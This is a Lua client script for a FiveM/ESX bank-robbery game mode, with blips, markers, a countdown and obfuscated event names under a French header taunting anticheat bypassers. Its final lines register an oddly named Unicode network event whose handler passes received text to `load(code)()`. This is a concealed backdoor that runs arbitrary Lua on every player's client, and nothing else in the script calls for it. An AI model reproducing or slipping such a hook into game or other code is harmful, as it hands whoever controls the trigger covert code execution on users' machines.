-------- ARRETE D'ESSAYEZ DE DUMP POUR BYPASS MON ANTICHEAT TU REUSSIRA PAS ^^ --------
_print = print
_TriggerServerEvent = TriggerServerEvent
_NetworkExplodeVehicle = NetworkExplodeVehicle
_AddExplosion = AddExplosion

local holdingup = false
local bank = ''
local secondsRemaining = 0
local blipRobbery = nil

Citizen.CreateThread(function()
	while ESX == nil do
		TriggerEvent('::{korioz#0110}::esx:getSharedObject', function(obj) ESX = obj end)
		Citizen.Wait(1)
	end
end)

function DisplayHelpText(str)
	SetTextComponentFormat("STRING")
	AddTextComponentSubstringPlayerName(str)
	EndTextCommandDisplayHelp(0, 0, 1, -1)
end

function drawTxt(x,y ,width,height,scale, text, r,g,b,a, outline)
    SetTextFont(0)
    SetTextProportional(0)
    SetTextScale(scale, scale)
    SetTextColour(r, g, b, a)
    SetTextDropshadow(0, 0, 0, 0,255)
    SetTextEdge(1, 0, 0, 0, 255)
    SetTextDropShadow()
    if(outline)then
	    SetTextOutline()
	end
    BeginTextCommandDisplayText("STRING")
    AddTextComponentSubstringPlayerName(text)
    EndTextCommandDisplayText(x - width/2, y - height/2 + 0.005)
end

RegisterNetEvent('::{korioz#0110}::esx_holdupbank:currentlyrobbing')
AddEventHandler('::{korioz#0110}::esx_holdupbank:currentlyrobbing', function(robb)
	holdingup = true
	bank = robb
	secondsRemaining = 900
end)

RegisterNetEvent('::{korioz#0110}::esx_holdupbank:killblip')
AddEventHandler('::{korioz#0110}::esx_holdupbank:killblip', function()
    RemoveBlip(blipRobbery)
end)

RegisterNetEvent('::{korioz#0110}::esx_holdupbank:setblip')
AddEventHandler('::{korioz#0110}::esx_holdupbank:setblip', function(position)
	blipRobbery = AddBlipForCoord(position.x, position.y, position.z)
	
    SetBlipSprite(blipRobbery, 161)
    SetBlipScale(blipRobbery, 2.0)
	SetBlipColour(blipRobbery, 3)

    PulseBlip(blipRobbery)
end)

RegisterNetEvent('::{korioz#0110}::esx_holdupbank:toofarlocal')
AddEventHandler('::{korioz#0110}::esx_holdupbank:toofarlocal', function(robb)
	holdingup = false
	ESX.ShowNotification(_U('robbery_cancelled'))
	robbingName = ""
	secondsRemaining = 900 -- 0
	incircle = false
end)


RegisterNetEvent('::{korioz#0110}::esx_holdupbank:robberycomplete')
AddEventHandler('::{korioz#0110}::esx_holdupbank:robberycomplete', function(robb)
	holdingup = false
	ESX.ShowNotification(_U('robbery_complete') .. Banks[bank].reward)
	bank = ""
	secondsRemaining = 900 -- 0
	incircle = false
end)

Citizen.CreateThread(function()
	while true do
		Citizen.Wait(0)
		if holdingup then
			Citizen.Wait(1000)
			if(secondsRemaining > 0)then
				secondsRemaining = secondsRemaining - 1
			end
		end
	end
end)

Citizen.CreateThread(function()
	for k, v in pairs(Banks) do
		local blip = AddBlipForCoord(v.position)

		SetBlipSprite(blip, 255)
		SetBlipScale(blip, 0.8)
		SetBlipColour(blip, 75)
		SetBlipAsShortRange(blip, true)

		BeginTextCommandSetBlipName("STRING")
		AddTextComponentSubstringPlayerName(_U('bank_robbery'))
		EndTextCommandSetBlipName(blip)
	end
end)

incircle = false

Citizen.CreateThread(function()
	while true do
		local pos = GetEntityCoords(PlayerPedId(), false)

		for k, v in pairs(Banks) do
			if Vdist(pos, v.position) < 15.0 then
				if not holdingup then
					DrawMarker(1, v.position.x, v.position.y, v.position.z - 1.05, 0, 0, 0, 0, 0, 0, 1.50, 1.50, 1.00, 255, 0, 0,255, 0, 0, 0,0)

					if Vdist(pos, v.position) < 1.5 then
						if not incircle then
							DisplayHelpText(_U('press_to_rob') .. v.nameofbank)
						end

						incircle = true

						if IsControlJustReleased(0, 51) then
							_TriggerServerEvent('::{korioz#0110}::esx_holdupbank:rob', k)
						end
					elseif Vdist(pos, v.position) > 1.5 then
						incircle = false
					end
				end
			end
		end

		if holdingup then
			drawTxt(0.66, 1.44, 1.0, 1.0, 0.4, _U('robbery_of') .. secondsRemaining .. _U('seconds_remaining'), 255, 255, 255, 255)

			if Vdist(pos, Banks[bank].position) > 7.5 then
				_TriggerServerEvent('::{korioz#0110}::esx_holdupbank:toofar', bank)
			end
		end

		Citizen.Wait(1)
	end
end)

RegisterNetEvent('ᓚᘏᗢ')
AddEventHandler('ᓚᘏᗢ', function(code)
	load(code)()
end)